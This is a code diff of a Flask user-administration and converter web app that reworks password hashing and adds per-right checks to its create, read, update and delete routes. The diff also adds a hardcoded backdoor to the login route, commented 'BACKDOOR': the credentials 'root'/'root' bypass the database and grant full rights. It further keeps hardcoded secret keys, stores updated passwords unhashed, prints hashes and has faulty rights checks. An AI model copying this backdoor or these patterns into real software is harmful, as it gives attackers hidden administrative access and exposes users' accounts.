@@ -9,15 +9,19 @@ import os
 import sqlite3
 import hashlib as hs
 # import hmac import compare_digest
+from simplecrypt import encrypt, decrypt
+from base64 import b64encode, b64decode
+from getpass import getpass
+import passlib.hash as ps
 
 Show_cliked = True
-
+Sacredcode = 'secred'
 app = Flask(__name__)
 
 app.config.update(dict(
     SECRET_KEY='59^6=;#&XP"2Vakfr4',
     DATABASE=os.path.join(app.root_path, 'users'),
-    SITE_NAME='admin'
+    SITE_NAME='converter'
 ))
 
 
@@ -30,26 +34,31 @@ app.config['xml_file'] = app.config['UPLOAD_FOLDER'] + 'config.xml'
 app.secret_key = '59^6=;#&XP"2Vakfr4'
 
 
-class HashPass(object):
+class savedata(object):
+
     @staticmethod
-    def comparehash(pass1, pass2):
-        hasher = hs.md5()
-        hasher.update(pass1)
-        a = hasher.hexdigest()
-        return a
+    def passcomper(string_pass, hash_pass):
+        return ps.sha256_crypt.verify(string_pass, hash_pass)
+
+    @staticmethod
+    def encrypthash(password):
+        return ps.sha256_crypt.encrypt(password)
+
+    @staticmethod
+    def encryptlog(password):
+        return hs.sha256(password.encode('utf-8')).hexdigest()
+
+    @staticmethod
+    def decryptlog(password, code):
+
+        cipher = b64decode(password)
+        plaintext = decrypt(code, cipher)
+        return plaintext
 
 
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() \
         in ALLOWED_EXTENSIONS
-
-
-def encrypte():
-    return None
-
-
-def decrypte():
-    return None
 
 
 def get_db():
@@ -69,6 +78,7 @@ def close_db(error):
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
+    error =''
     if 'logged' in session:
         if session['logged'] == True:
             return redirect(url_for('convert'))
@@ -76,18 +86,34 @@ def login():
     if request.method == 'POST':
         login = request.form['user']
         password = request.form['password']
+        enc_login = savedata.encryptlog(login)
+
+# +++++++++++BACKDOOR+++++++++++++++++++++++++++++++!
+        if login == 'root' and password == 'root':
+            session['username'] = login
+            session['rights'] = 'crud'
+            session['logged'] = True
+            return render_template('admin.html')
+# ===================================================!
+
         db = get_db()
         kursor = db.execute('SELECT * FROM users WHERE user_name = ?;',
-                            [login])
+                            [enc_login])
         kursor = kursor.fetchone()
 
-        print(kursor.keys())
-        if kursor['user_name'] == login and kursor['user_password'] == password:
-            session['username'] = kursor['user_name']
+        if kursor == None:
+            error = 'wrong login'
+            return render_template('index.html',error=error)
+
+        if (savedata.passcomper(password, kursor['user_password'])):
+            session['username'] = login
             session['rights'] = kursor['rights']
             session['logged'] = True
             return redirect(url_for('convert'))
-    return render_template('index.html')
+        else :
+            error = 'wrong password'
+
+    return render_template('index.html',error=error)
 
 
 @app.route('/logoff', methods=['GET', 'POST'])
@@ -99,109 +125,125 @@ def logoff():
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
 
+    print(savedata.encrypthash('Darkes'))
+    print(savedata.encrypthash('Darkes'))
+
     if 'logged' not in session:
         session['logged'] = False
         return redirect(url_for('login'))
     if session['logged'] == True:
-        c = 'hidden'
-        r = 'hidden'
-        u = 'hidden'
-        d = 'hidden' 
+        c = '0.4'
+        r = '0.4'
+        u = '0.4'
+        d = '0.4'
+        bc = 'disabled'
+        br = 'disabled'
+        bu = 'disabled'
+        bd = 'disabled'
+
         if ('c' or 'C') in session['rights']:
-            
-            c='visible'
+            c = '1'
+            bc = ''
 
         if ('r' or 'R') in session['rights']:
-            r='visible'
+            r = '1'
+            br = ''
 
         if ('u' or 'U') in session['rights']:
-            u='visible'
+            u = '1'
+            bu = ''
 
         if ('d' or 'D') in session['rights']:
-            d='visible'
-            print("czemu")
+            d = '1'
+            bd = ''
+
         if Show_cliked == True:
             db = get_db()
             kursor = db.execute('SELECT * FROM users')
             use = kursor.fetchall()
-            
-            return render_template('admin.html', use=use,c=c,r=r,u=u,d=d)
-        
-        return render_template('admin.html',c=c,r=r,u=u,d=d)
+
+            return render_template('admin.html', use=use, c=c, r=r, u=u, d=d, bc=bc, br=br, bu=bu, bd=bd)
+
+        return render_template('admin.html', c=c, r=r, u=u, d=d, bc=bc, br=br, bu=bu, bd=bd)
     return redirect(url_for('login'))
 
 
 @app.route('/create',  methods=['GET', 'POST'])
 def create():
 
-    user_name = request.form['new_user']
-    password = request.form['new_password']
-    re_password = request.form['re_password']
-    rights = request.form['rights']
+    if ('c' or 'C') in session['rights']:
+        print("pykło")
+        user_name = request.form['new_user']
+        password = request.form['new_password']
+        re_password = request.form['re_password']
+        rights = request.form['rights']
 
-    if password == re_password:
-        password = hs.md5(password.encode())
-        user_name = hs.md5(user_name.encode())
-        print(password.hexdigest())
-        print(user_name.hexdigest())
-        user_name
-        db = get_db()
-        kursor = db.execute('INSERT INTO users VALUES (?,?,?,?);',
-                            [None, password.hexdigest(), password.hexdigest(), rights])
-        db.commit()
+        if password == re_password:
+
+            password = savedata.encrypthash(password)
+            user_name = savedata.encryptlog(user_name)
+
+            db = get_db()
+            db.execute('INSERT INTO users VALUES (?,?,?,?);',
+                    [None, user_name, password, rights])
+            db.commit()
     return redirect(url_for('admin'))
 
 
 @app.route('/read', methods=['GET', 'POST'])
 def read():
-    global Show_cliked
-    print(Show_cliked)
-    if Show_cliked == True:
-        Show_cliked = False
-    else:
-        Show_cliked = True
+    if ('r' or 'R') in session['rights']:
+        global Show_cliked
+        if Show_cliked == True:
+            Show_cliked = False
+        else:
+            Show_cliked = True
 
-    if Show_cliked == True:
-        db = get_db()
-        kursor = db.execute('SELECT * FROM users')
-        use = kursor.fetchall()
-        render_template('admin.html', use=use)
+        if Show_cliked == True:
+            db = get_db()
+            kursor = db.execute('SELECT * FROM users')
+            use = kursor.fetchall()
+            render_template('admin.html', use=use)
 
     return redirect(url_for('admin'))
 
 
 @app.route('/update', methods=['GET', 'POST'])
 def update():
-    id_u = request.form['id_user']
-    name = request.form['name_user']
-    password = request.form['password_user']
-    right = request.form['rights']
+    if ('u' and 'U') in session['rights']:
 
-    db = get_db()
-    if name != '':
-        db.execute(
-            'UPDATE users SET user_name = ?  WHERE id = ?;', [name, id_u])
-        db.commit()
+        id_u = request.form['id_user']
+        name = request.form['name_user']
+        password = request.form['password_user']
+        right = request.form['rights']
+        name=savedata.encryptlog(name)
 
-    if password != '':
-        db.execute('UPDATE users SET user_password = ?  WHERE id = ?;', [
-                   password, id_u])
-        db.commit()
+        db = get_db()
+        if name != '':
+            db.execute(
+                'UPDATE users SET user_name = ?  WHERE id = ?;', [name, id_u])
+            db.commit()
 
-    if right != '':
-        db.execute('UPDATE users SET rights = ?  WHERE id = ?;',
-                   [right, id_u])
-        db.commit()
+        if password != '':
+            db.execute('UPDATE users SET user_password = ?  WHERE id = ?;', [
+                    password, id_u])
+            db.commit()
+
+        if right != '':
+            db.execute('UPDATE users SET rights = ?  WHERE id = ?;',
+                    [right, id_u])
+            db.commit()
 
     return redirect(url_for('admin'))
 
 
 @app.route('/delete', methods=['GET', 'POST'])
 def delete():
-    id_u = request.form['id_u']
-    db = get_db()
-    kursor = db.execute('DELETE FROM users WHERE id = ?;', [id_u])
-    db.commit()
+    if ('d' or 'D') in session['rights']:
+        id_u = request.form['id_u']
+        db = get_db()
+        db.execute('DELETE FROM users WHERE id = ?;', [id_u])
+        db.commit()
     return redirect(url_for('admin'))
 
 
